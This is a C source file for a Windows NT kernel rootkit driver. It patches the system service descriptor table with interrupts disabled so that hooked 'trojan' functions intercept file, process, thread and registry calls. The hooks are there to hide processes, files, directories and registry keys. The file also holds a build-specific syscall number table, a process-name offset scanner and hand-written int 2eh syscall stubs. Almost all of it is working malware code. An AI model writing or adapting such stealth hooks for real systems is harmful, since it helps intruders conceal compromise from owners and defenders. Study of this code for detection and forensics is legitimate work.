
#include "rk_driver.h"
#include "rk_kpatch.h"
#include "rk_ioman.h"
#include "rk_memory.h"
#include "rk_process.h"
#include "rk_security.h"
#include "rk_object.h"
#include "rk_interrupt.h"
#include "rk_utility.h"


ULONG BuildNumber; /* mask off hiword to get actual number */

/* ________________________________________________________________________________
 . This is the offset into a KPEB of the current process name. This is determined
 . dynamically by scanning the process block belonging to the GUI for its name.
 . ________________________________________________________________________________ */
ULONG gProcessNameOffset;

/* ________________________________________________________________________________
 . Kernel functions that will be hooked.
 . ------------------------------------
 . The Rootkit is based on function hooking.  Everything the rootkit can do is
 . based upon it.  For example, using call hooks, the rootkit can hide a process,
 . registry key, or file.  The rootkit can redirect calls.  All of these call hooks
 . can be exploited.  Extensive Debug-tracing is enabled so that you can experiment
 . with various tricks.  
 . ________________________________________________________________________________ */

/* ________________________________________________
 . our global function pointers to the actual
 . original kernel functions that we have hooked
 . ________________________________________________ */

NTCREATEFILE		OldNtCreateFile;
ZWOPENFILE			OldZwOpenFile;
NTCREATEPROCESS		OldNtCreateProcess;
ZWCREATESECTION		OldZwCreateSection;
ZWCREATETHREAD		OldZwCreateThread;
ZWCLOSE				OldZwClose;

ZWOPENKEY			OldZwOpenKey;
ZWQUERYKEY			OldZwQueryKey;
ZWQUERYVALUEKEY		OldZwQueryValueKey;
ZWENUMERATEVALUEKEY	OldZwEnumerateValueKey;
ZWENUMERATEKEY		OldZwEnumerateKey;
ZWDELETEKEY			OldZwDeleteKey;
ZWFLUSHKEY			OldZwFlushKey;
ZWSETVALUEKEY		OldZwSetValueKey;
ZWCREATEKEY			OldZwCreateKey;
ZWDELETEVALUEKEY	OldZwDeleteValueKey;

ZWQUERYDIRECTORYOBJECT OldZwQueryDirectoryObject;
ZWQUERYDIRECTORYFILE OldZwQueryDirectoryFile;
ZWQUERYSYSTEMINFORMATION OldZwQuerySystemInformation;

/* _____________________________________________
 . the callnumbers for kernel functions we are
 . implementing manually - these vary depending
 . on NT build number.
 . _____________________________________________ */

DWORD _callnumber_NtCreateProcess = 0;
DWORD _callnumber_NtCreateThread = 0;
DWORD _callnumber_NtQueryDirectoryObject = 0;

/* ____________________________________________________________________________
 . OK, this should be fairly self explanatory - we are hooking syscalls in
 . this function.  We get pointers to the old functions (the real ones) and
 . set the table to point to our trojan function.  It is up to our trojan
 . function to then make the real call to the original function.
 . OldZwXXX is the actual, real function in the kernel.
 . NewZwXXX is the rootkit trojan version of the function.
 .
 . Note that we disable interrupts while we patch the syscall table.
 . ____________________________________________________________________________ */
VOID HookSyscalls( void )
{
		DbgPrint("rootkit: hooking syscalls\n");
        
		/* the ones we do manually */
		if(_callnumber_NtCreateProcess)
			OldNtCreateProcess=	
			(NTCREATEPROCESS)	KeServiceDescriptorTable.ServiceTableBase[_callnumber_NtCreateProcess];
		
		if(_callnumber_NtCreateThread)
			OldZwCreateThread=	
			(ZWCREATETHREAD)	KeServiceDescriptorTable.ServiceTableBase[_callnumber_NtCreateThread];

		if(_callnumber_NtQueryDirectoryObject)
			OldZwQueryDirectoryObject=	
			(ZWQUERYDIRECTORYOBJECT) KeServiceDescriptorTable.ServiceTableBase[_callnumber_NtQueryDirectoryObject];

		/* the rest are imported */
		OldNtCreateFile=		(NTCREATEFILE)(SYSTEMSERVICE(ZwCreateFile));
		OldZwOpenFile=			(ZWOPENFILE)(SYSTEMSERVICE(ZwOpenFile));

        OldZwCreateSection=		(ZWCREATESECTION)(SYSTEMSERVICE(ZwCreateSection));
        OldZwClose=				(ZWCLOSE)(SYSTEMSERVICE(ZwClose));

		OldZwOpenKey=			(ZWOPENKEY)(SYSTEMSERVICE(ZwOpenKey));
		OldZwQueryKey=			(ZWQUERYKEY)(SYSTEMSERVICE(ZwQueryKey));
		OldZwQueryValueKey=		(ZWQUERYVALUEKEY)(SYSTEMSERVICE(ZwQueryValueKey));
		OldZwEnumerateValueKey=	(ZWENUMERATEVALUEKEY)(SYSTEMSERVICE(ZwEnumerateValueKey));
		OldZwEnumerateKey=		(ZWENUMERATEKEY)(SYSTEMSERVICE(ZwEnumerateKey));
		OldZwDeleteKey=			(ZWDELETEKEY)(SYSTEMSERVICE(ZwDeleteKey));
		OldZwFlushKey=			(ZWFLUSHKEY)(SYSTEMSERVICE(ZwFlushKey));
		OldZwSetValueKey=		(ZWSETVALUEKEY)(SYSTEMSERVICE(ZwSetValueKey));
		OldZwCreateKey=			(ZWCREATEKEY)(SYSTEMSERVICE(ZwCreateKey));
		OldZwDeleteValueKey=	(ZWDELETEVALUEKEY)(SYSTEMSERVICE(ZwDeleteValueKey));
		
		/* directory hiding */
		OldZwQueryDirectoryFile=(ZWQUERYDIRECTORYFILE)(SYSTEMSERVICE(ZwQueryDirectoryFile));
		/* process hiding */
		OldZwQuerySystemInformation =(ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));

		_asm cli
		
		if(_callnumber_NtCreateProcess)
			(NTCREATEPROCESS)
			KeServiceDescriptorTable.ServiceTableBase[_callnumber_NtCreateProcess] 
			= NewNtCreateProcess;

		if(_callnumber_NtCreateThread)
			(ZWCREATETHREAD)
			KeServiceDescriptorTable.ServiceTableBase[_callnumber_NtCreateThread] 
			= NewZwCreateThread;

		if(_callnumber_NtQueryDirectoryObject)	
			(ZWQUERYDIRECTORYOBJECT)
			KeServiceDescriptorTable.ServiceTableBase[_callnumber_NtQueryDirectoryObject] 
			= NewZwQueryDirectoryObject;

		/* process, file, & thread functions */
        (NTCREATEFILE)			(SYSTEMSERVICE(ZwCreateFile))=			NewNtCreateFile;
		(ZWOPENFILE)			(SYSTEMSERVICE(ZwOpenFile))=			NewZwOpenFile;

		(ZWCREATESECTION)		(SYSTEMSERVICE(ZwCreateSection))=		NewZwCreateSection;
		(ZWCLOSE)				(SYSTEMSERVICE(ZwClose))=				NewZwClose;
		
		/* registry functions */
		(ZWOPENKEY)				(SYSTEMSERVICE(ZwOpenKey))=				NewZwOpenKey;
		(ZWQUERYKEY)			(SYSTEMSERVICE(ZwQueryKey))=			NewZwQueryKey;
		(ZWQUERYVALUEKEY)		(SYSTEMSERVICE(ZwQueryValueKey))=		NewZwQueryValueKey;
		(ZWENUMERATEVALUEKEY)	(SYSTEMSERVICE(ZwEnumerateValueKey))=	NewZwEnumerateValueKey;
		(ZWENUMERATEKEY)		(SYSTEMSERVICE(ZwEnumerateKey))=		NewZwEnumerateKey;
		(ZWDELETEKEY)			(SYSTEMSERVICE(ZwDeleteKey))=			NewZwDeleteKey;
		(ZWFLUSHKEY)			(SYSTEMSERVICE(ZwFlushKey))=			NewZwFlushKey;
		(ZWSETVALUEKEY)			(SYSTEMSERVICE(ZwSetValueKey))=			NewZwSetValueKey;
		(ZWCREATEKEY)			(SYSTEMSERVICE(ZwCreateKey))=			NewZwCreateKey;
		(ZWDELETEVALUEKEY)		(SYSTEMSERVICE(ZwDeleteValueKey))=		NewZwDeleteValueKey;
		
		/* directory hiding */
		(ZWQUERYDIRECTORYFILE)  (SYSTEMSERVICE(ZwQueryDirectoryFile))=  NewZwQueryDirectoryFile;
		
		/* process hiding */
		(ZWQUERYSYSTEMINFORMATION) (SYSTEMSERVICE(ZwQuerySystemInformation))= NewZwQuerySystemInformation;

		_asm sti
        
		//TestLaunchProcess(); /* greg was testing here */	
		return STATUS_SUCCESS;
}

/* clearly to unhook what we have hooked :-| */
VOID UnhookSyscalls( void )
{
	DbgPrint("unhooking services\n");
    _asm cli
	/* the manual ones */
	if(_callnumber_NtCreateProcess)
		(NTCREATEPROCESS)
		KeServiceDescriptorTable.ServiceTableBase[_callnumber_NtCreateProcess] 
		= OldNtCreateProcess;

	if(_callnumber_NtCreateThread)
		(ZWCREATETHREAD)
		KeServiceDescriptorTable.ServiceTableBase[_callnumber_NtCreateThread] 
		= OldZwCreateThread;

	if(_callnumber_NtQueryDirectoryObject)	
		(ZWQUERYDIRECTORYOBJECT) 
		KeServiceDescriptorTable.ServiceTableBase[_callnumber_NtQueryDirectoryObject] 
		= OldZwQueryDirectoryObject;

	/* the imported ones */
    (NTCREATEFILE)(SYSTEMSERVICE(ZwCreateFile))			=OldNtCreateFile;
	(ZWOPENFILE)(SYSTEMSERVICE(ZwOpenFile))				=OldZwOpenFile;

	(ZWCREATESECTION)(SYSTEMSERVICE(ZwCreateSection))	=OldZwCreateSection;
	(ZWCLOSE)(SYSTEMSERVICE(ZwClose))					=OldZwClose;

	(ZWOPENKEY)(SYSTEMSERVICE(ZwOpenKey))				=OldZwOpenKey;
	(ZWQUERYKEY)(SYSTEMSERVICE(ZwQueryKey))				=OldZwQueryKey;
	(ZWQUERYVALUEKEY)(SYSTEMSERVICE(ZwQueryValueKey))	=OldZwQueryValueKey;
	(ZWENUMERATEVALUEKEY)(SYSTEMSERVICE(ZwEnumerateValueKey))=OldZwEnumerateValueKey;
	(ZWENUMERATEKEY)(SYSTEMSERVICE(ZwEnumerateKey))		=OldZwEnumerateKey;
	(ZWDELETEKEY)(SYSTEMSERVICE(ZwDeleteKey))			=OldZwDeleteKey;
	(ZWFLUSHKEY)(SYSTEMSERVICE(ZwFlushKey))				=OldZwFlushKey;
	(ZWSETVALUEKEY)(SYSTEMSERVICE(ZwSetValueKey))		=OldZwSetValueKey;
	(ZWCREATEKEY)(SYSTEMSERVICE(ZwCreateKey))			=OldZwCreateKey;
	(ZWDELETEVALUEKEY)(SYSTEMSERVICE(ZwDeleteValueKey))	=OldZwDeleteValueKey;
	
	(ZWQUERYDIRECTORYFILE)(SYSTEMSERVICE(ZwQueryDirectoryFile))	=OldZwQueryDirectoryFile;
	
	(ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation)) = OldZwQuerySystemInformation;

	_asm sti
    return;
}


/* _____________________________________________________________________________
 . These functions replace those that are not exported from NTOSKRNL.EXE -
 . we have to implement them manually.  Fortunately most of the functions
 . do not require this.  If you add a function here - you need to know the
 . call number and the stack correction for return.
 .
 . Beware: call numbers are different depending on which build of NT your on!
 .
 . CALL						NT351		NT40		WIN2K
 . ------------------------------------------------------
 . ZwCreateProcess			1E			1F			2A
 . ZwCreateThread						24			2F
 . ZwQueryDirectoryObject				66			82
 . _____________________________________________________________________________ */

void SetupCallNumbers()
{
	BuildNumber = (NtBuildNumber & 0x0000FFFF);
	DbgPrint("ROOTKIT: Detected build number is %d, ", BuildNumber);
	switch(BuildNumber)
	{
		/* call numbers that are not set will not be hooked - they
		 . are left as NULL */
	case 0x421:
		DbgPrint("Windows NT 3.51\n");
		_callnumber_NtCreateProcess = 0x1E;		
		break;
	case 0x565:
		DbgPrint("Windows NT 4.0\n");
		_callnumber_NtCreateProcess = 0x1F;
		_callnumber_NtCreateThread = 0x24;
		_callnumber_NtQueryDirectoryObject = 0x66;
		break;
	case 0x850: /* build 2128 appears to work OK */
	case 0x755: /* build 1877 is untested */
		DbgPrint("Windows 2000 Beta 2\n");
		_callnumber_NtCreateProcess = 0x2A;
		_callnumber_NtCreateThread = 0x2F;
		_callnumber_NtQueryDirectoryObject = 0x82;
		break;
	default:
		DbgPrint("Warning - unsupported windows version.  No call hooks will take place!\n");
		break;
	}
}

/* _____________________________________________________________________
 . GetProcessNameOffset
 .
 . Scan the KPEB looking for the "System" process name - because 
 . DriverEntry is called in that context.  This offset becomes a 
 . reference for later. -thanks to sysinternals for this trick ;-)
 . _____________________________________________________________________ */
void GetProcessNameOffset()
{
    PEPROCESS curproc;
    int i;
	curproc = PsGetCurrentProcess();
    for( i = 0; i < 3*PAGE_SIZE; i++ ) 
	{
        if( !strncmp( "System", (PCHAR) curproc + i, strlen("System") ))
		{
            gProcessNameOffset = i;
		}
    }
}


/* ________________________________________________________________________
 . Get the name of the current process
 . ________________________________________________________________________ */
BOOL GetProcessName( PCHAR theName )
{
    PEPROCESS       curproc;
    char            *nameptr;
    ULONG           i;
    KIRQL           oldirql;

    if( gProcessNameOffset ) 
	{
        curproc = PsGetCurrentProcess();
        nameptr   = (PCHAR) curproc + gProcessNameOffset;
        strncpy( theName, nameptr, NT_PROCNAMELEN );
        theName[NT_PROCNAMELEN] = 0; /* NULL at end */
		return TRUE;
    } 
	return FALSE;
}


/* __________________________________________________________________________
 . eweet we do it cuz there ain't no Xp0rt
 . __________________________________________________________________________ */
_declspec(naked) NTSTATUS NTAPI ZwCreateProcess(
			PHANDLE FileHandle,
            ACCESS_MASK DesiredAccess,
            POBJECT_ATTRIBUTES ObjectAttributes,
            PIO_STATUS_BLOCK IoStatusBlock,
            PLARGE_INTEGER AllocationSize OPTIONAL,
            ULONG FileAttributes,
            ULONG ShareAccess,
            ULONG CreateDisposition,
            ULONG CreateOptions,
            PVOID EaBuffer OPTIONAL,
            ULONG EaLength )
{
	_asm 
	{
		mov eax, _callnumber_NtCreateProcess
		lea edx, [esp+4]
		int 2eh
		ret 20h
	}
}

_declspec(naked) NTSTATUS NTAPI ZwCreateThread (
	OUT PHANDLE phThread,
	IN ACCESS_MASK AccessMask,
	IN POBJECT_ATTRIBUTES ObjectAttributes,
	IN HANDLE hProcess,
	OUT PCLIENT_ID pClientId,
	IN PCONTEXT pContext,
	OUT PSTACKINFO pStackInfo,
	IN BOOLEAN bSuspended )
{
	_asm 
	{
		mov eax, _callnumber_NtCreateThread
		lea edx, [esp+4]
		int 2eh
		ret 20h
	}
}

_declspec(naked) NTSTATUS NTAPI ZwQueryDirectoryObject(
	IN HANDLE hDirectory,
	OUT PQUERYDIRECTORYOBJECTBUFFER DirectoryEntryBuffer,
	IN ULONG DirectoryEntryBufferSize,
	IN BOOLEAN  bOnlyFirstEntry,
	IN BOOLEAN bFirstEntry,
	IN PULONG  BytesReturned,
	IN PULONG  EntryIndex )
{
	_asm
	{
		mov eax, _callnumber_NtQueryDirectoryObject
		lea edx, [esp+4]
		int 2eh
		ret 1Ch
	}
}
